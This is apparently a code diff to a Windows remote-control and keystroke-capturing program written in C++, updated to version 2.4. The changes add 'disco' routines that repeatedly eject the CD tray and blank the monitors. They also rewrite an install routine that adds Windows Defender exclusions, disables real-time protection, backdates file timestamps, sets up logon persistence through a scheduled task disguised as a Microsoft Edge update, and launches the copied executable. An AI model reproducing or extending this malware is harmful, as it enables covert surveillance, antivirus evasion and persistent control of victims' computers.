@@ -3,6 +3,7 @@
 #pragma comment(lib,"Wininet.lib")
 #pragma comment (lib,"gdiplus.lib")
 #pragma comment(lib, "urlmon.lib")
+#pragma comment(lib, "Winmm.lib")
 #include <iostream>
 #include <Windows.h>
 #include <gdiplus.h>
@@ -14,6 +15,7 @@
 #include <fstream>
 #include <vector>
 #include <sstream>
+#include <mmsystem.h>
 
 using namespace Gdiplus;
 
@@ -25,14 +27,16 @@ bool isLive = false;
 bool isTyping = false;
 bool alt = false;
 bool connected = false; //Connected to server
+bool disco = false;
 
 std::vector<std::string> buffer;
 std::vector<std::string> strokesPackage;
 sio::client client;
 
 int liveDelay = 100;
+int discoDelay = 100;
 const std::string server = "http://localhost:3000";
-const std::string VERSION = "2.1";
+const std::string VERSION = "2.4";
 const char base64Table[] = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
 
 bool IsConnectedToInternet()
@@ -71,8 +75,22 @@ std::string Base64Encode(const std::string& in)
 	return out;
 }
 
+std::string get_current_username() {
+	char buffer[256];
+	DWORD size = sizeof(buffer);
+	if (GetUserNameA(buffer, &size)) {
+		return std::string(buffer);
+	}
+	else {
+		return "";
+	}
+}
+
 void ClickAtPosition(int x, int y) 
 {
+	POINT oldCursorPos;
+	GetCursorPos(&oldCursorPos);
+
 	SetCursorPos(x, y);
 
 	INPUT Input = { 0 };
@@ -84,6 +102,9 @@ void ClickAtPosition(int x, int y)
 	Input.type = INPUT_MOUSE;
 	Input.mi.dwFlags = MOUSEEVENTF_LEFTUP;
 	SendInput(1, &Input, sizeof(INPUT));
+
+	SetCursorPos(oldCursorPos.x, oldCursorPos.y);
+
 	Sleep(100);
 }
 
@@ -155,6 +176,45 @@ void PressKey(const std::string& key)
 	}
 
 	SendInput(inputs.size(), inputs.data(), sizeof(INPUT));
+}
+
+void DiscoModeCDROM()
+{
+	while (true)
+	{
+		if (disco)
+		{
+			MCI_OPEN_PARMS mciOpen;
+			mciOpen.lpstrDeviceType = L"cdaudio";
+			mciSendCommand(NULL, MCI_OPEN, MCI_OPEN_TYPE, (DWORD)(LPVOID)&mciOpen);
+			MCI_SET_PARMS mciSet;
+			mciSet.dwTimeFormat = MCI_FORMAT_MILLISECONDS;
+			mciSendCommand(mciOpen.wDeviceID, MCI_SET, MCI_SET_TIME_FORMAT, (DWORD)(LPVOID)&mciSet);
+			mciSendCommand(mciOpen.wDeviceID, MCI_SET, MCI_SET_DOOR_OPEN, 0);
+
+			Sleep(discoDelay);
+
+			mciSendCommand(mciOpen.wDeviceID, MCI_SET, MCI_SET_DOOR_CLOSED, 0);
+			mciSendCommand(mciOpen.wDeviceID, MCI_CLOSE, 0, NULL);
+		}
+		else
+			Sleep(100);
+	}
+}
+
+void DiscoModeDisplay()
+{
+	while (true)
+	{
+		if (disco)
+		{
+			SendMessage(HWND_BROADCAST, WM_SYSCOMMAND, SC_MONITORPOWER, (LPARAM)2);
+			Sleep(discoDelay);
+			SendMessage(HWND_BROADCAST, WM_SYSCOMMAND, SC_MONITORPOWER, (LPARAM)-1);
+		}
+		else
+			Sleep(100);
+	}
 }
 
 std::string toUpper(const std::string& str) {
@@ -930,28 +990,54 @@ void SelfDestruct(std::string processName, std::string filePath)
 	system(std::string("taskkill /F /IM " + processName).c_str());
 }
 
-void InstallEmmetBat(std::string path)
+void InstallEmmetBat(std::string path, std::string wantedDir)
 {
-	std::string createDir = "mkdir \"C:\Program Files\Microsoft\OneDrive\"";
-	system(createDir.c_str());
+	std::string onlyDirectory = "";
+	
+	const size_t last_slash_idx = wantedDir.rfind('\\');
+	if (std::string::npos != last_slash_idx)
+	{
+		onlyDirectory = wantedDir.substr(0, last_slash_idx);
+	}
 
-	std::string addException = "Powershell.exe -Command \"Add-MpPreference -ExclusionPath \"C:\\'Program Files'\\Microsoft\\OneDrive\"\"";
-	system(addException.c_str());
+	//New dir
+	std::string command = "powershell.exe -Command \"New-Item -ItemType Directory -Path \"" + onlyDirectory + "\" -Force\"";
+	system(command.c_str());
+	std::cout << "New directory created. OK." << std::endl;
+
+	//Anti Virus
+	std::string addDownloadsException = "Powershell.exe -Command \"Add-MpPreference -ExclusionPath \"C:\\Users\\" + get_current_username() + "\\Downloads\"\"";
+	system(addDownloadsException.c_str());
+
+	std::string addFileException = "Powershell.exe -Command \"Add-MpPreference -ExclusionPath \"" + wantedDir + "\"\"";
+	system(addFileException.c_str());
+	std::cout << "Exceptions added. OK" << std::endl;
+
+	std::string addFolderException = "Powershell.exe -Command \"Add-MpPreference -ExclusionPath \"" + onlyDirectory + "\"\"";
+	system(addFolderException.c_str());
+	std::cout << "Exceptions added. OK" << std::endl;
 
 	std::string disableAntiVirus = "Powershell.exe -Command \"Set-MpPreference -DisableRealtimeMonitoring $true\"";
 	system(disableAntiVirus.c_str());
 
-	std::string moveToLocation = "copy " + path + " \"C:\\Program Files\\Microsoft\\OneDrive\\EdgeUpdater.exe\"";
+	//File copying
+	std::string moveToLocation = "Powershell.exe -Command \"Copy-Item " + path + " -Destination " + wantedDir +"\"";
 	system(moveToLocation.c_str());
+	std::cout << "Moved to new location. OK" << std::endl;
 
-	std::string changeModifyTime = "Powershell.exe -Command \"\(Get-Item \"C:\\'Program Files'\\Microsoft\\OneDrive\\EdgeUpdater.exe\").LastWriteTime=('14 August 2016 13:14 : 00')\"\ ";
-	system(changeModifyTime.c_str());
+	std::string changeTime = "Powershell.exe -Command \"Get-ChildItem -Path \"" + wantedDir + "\" -Recurse | ForEach-Object { $_.LastWriteTime = Get-Date '14 August 2016 13:14 : 00' }\"";
+	system(changeTime.c_str());
+	std::cout << "Time changed. OK" << std::endl;
 
-	std::string addToScheduler = "schtasks /create /tn \"MicrosoftEdgeUpdate\"\ /tr \"C:\\Program Files\\Microsoft\\OneDrive\\EdgeUpdater.exe\"\ /sc onlogon /rl highest";
-	system(addToScheduler.c_str());
+	//Scheduler
+	std::string scheduler = "Powershell.exe -Command \"$action = New-ScheduledTaskAction -Execute \"" + wantedDir + "\"; $trigger = New-ScheduledTaskTrigger -AtLogOn; Register-ScheduledTask -TaskName 'MicrosoftEdgeUpdateCoreTask' -Action $action -Trigger $trigger -Force\"";
+	system(scheduler.c_str());
+	std::cout << "Added to scheduler. OK" << std::endl;
 
-	std::string runNewEmmet = "start \"\" \"C:\\Program Files\\Microsoft\\OneDrive\\EdgeUpdater.exe\"";
+	//Running new emmet
+	std::string runNewEmmet = "powershell.exe -Command \"Start-Process \"" + wantedDir + "\"\"";
 	system(runNewEmmet.c_str());
+	std::cout << "Started new exe. OK" << std::endl;
 }
 
 void UpdateBat(std::string actualFileName, std::string dir)
